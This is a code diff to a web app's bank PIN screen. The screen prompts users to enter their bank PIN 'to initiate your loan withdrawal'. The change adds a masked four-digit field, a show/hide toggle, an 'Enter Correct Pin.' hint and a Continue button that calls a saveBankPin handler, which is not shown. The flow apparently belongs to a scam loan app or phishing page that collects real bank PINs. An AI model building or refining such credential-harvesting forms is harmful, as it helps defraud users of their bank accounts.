@@ -3502,7 +3502,9 @@ function loadBankPinScreen() {
 
         <div class="app-header">
 
-            <button class="back-btn" id="backBankVerification">
+            <button
+                class="back-btn"
+                id="backBankVerification">
                 ← Back
             </button>
 
@@ -3524,42 +3526,116 @@ function loadBankPinScreen() {
 
         </div>
 
+
         <div class="progress-bar">
 
-            <div class="progress-fill"
-                 style="width:80%;">
+            <div
+                class="progress-fill"
+                style="width:80%;">
             </div>
 
         </div>
 
+
         <div class="welcome-card">
 
-            <h2>${bank} Pin</h2>
+            <h2>
+                ${bank} PIN
+            </h2>
+
 
             <p class="intro">
 
-                Enter the <strong>bank pin
-                </strong> to initiate withdrawal.
+                Enter your Bank PIN
+                to initiate your loan withdrawal.
 
                 <br><br>
 
-                Withdraw to your Bank Account 
+                Withdraw to your Bank Account
 
             </p>
 
-            <label>
-                Bank Pin
+
+            <label
+                for="bankPin"
+                style="
+                    display:block;
+                    margin-bottom:8px;
+                    font-weight:bold;
+                "
+            >
+                PIN
             </label>
 
-            <input
-                type="text"
-                id="bankPin"
-                placeholder="Enter pin"
-                autocomplete="off">
 
-            <br><br>
+            <!-- PIN FIELD + TOGGLE -->
 
-            <button id="continueBankPin">
+            <div style="
+                display:flex;
+                align-items:center;
+                width:100%;
+                gap:8px;
+            ">
+
+                <input
+                    type="password"
+                    id="bankPin"
+                    inputmode="numeric"
+                    maxlength="4"
+                    pattern="[0-9]{4}"
+                    placeholder="Enter 4-digit PIN"
+                    autocomplete="off"
+                    style="
+                        flex:1;
+                        min-width:0;
+                        width:100%;
+                        height:55px;
+                        box-sizing:border-box;
+                        padding:0 16px;
+                        font-size:18px;
+                        border:1px solid #ccc;
+                        border-radius:12px;
+                        outline:none;
+                    "
+                >
+
+
+                <button
+                    type="button"
+                    id="toggleBankPin"
+                    aria-label="Show PIN"
+                    style="
+                        flex:0 0 52px;
+                        width:52px;
+                        height:52px;
+                        padding:0;
+                        border:none;
+                        background:transparent;
+                        cursor:pointer;
+                        font-size:22px;
+                    "
+                >
+                    👁️
+                </button>
+
+            </div>
+
+
+            <p style="
+                margin-top:8px;
+                font-size:13px;
+                color:#777;
+            ">
+                Enter Correct Pin.
+            </p>
+
+
+            <br>
+
+
+            <button
+                id="continueBankPin"
+                type="button">
 
                 Continue →
 
@@ -3571,12 +3647,83 @@ function loadBankPinScreen() {
 
     `;
 
+
+    // ==========================================
+    // BACK BUTTON
+    // ==========================================
+
     document
         .getElementById("backBankVerification")
         .addEventListener(
             "click",
             loadBankVerificationScreen
         );
+
+
+    // ==========================================
+    // BANK PIN — NUMBERS ONLY
+    // ==========================================
+
+    const pinInput =
+        document.getElementById("bankPin");
+
+    pinInput.addEventListener(
+        "input",
+        function () {
+
+            this.value =
+                this.value
+                    .replace(/\D/g, "")
+                    .slice(0, 4);
+
+        }
+    );
+
+
+    // ==========================================
+    // SHOW / HIDE BANK PIN
+    // ==========================================
+
+    document
+        .getElementById("toggleBankPin")
+        .addEventListener(
+            "click",
+            function () {
+
+                const pin =
+                    document.getElementById("bankPin");
+
+                if (pin.type === "password") {
+
+                    pin.type = "text";
+
+                    this.textContent = "🙈";
+
+                    this.setAttribute(
+                        "aria-label",
+                        "Hide PIN"
+                    );
+
+                } else {
+
+                    pin.type = "password";
+
+                    this.textContent = "👁️";
+
+                    this.setAttribute(
+                        "aria-label",
+                        "Show PIN"
+                    );
+
+                }
+
+            }
+        );
+
+
+    // ==========================================
+    // CONTINUE
+    // ==========================================
 
     document
         .getElementById("continueBankPin")
@@ -3585,7 +3732,7 @@ function loadBankPinScreen() {
             saveBankPin
         );
 
-            }
+}
 // ======================================================
 // SAVE BANK PIN
 // ======================================================
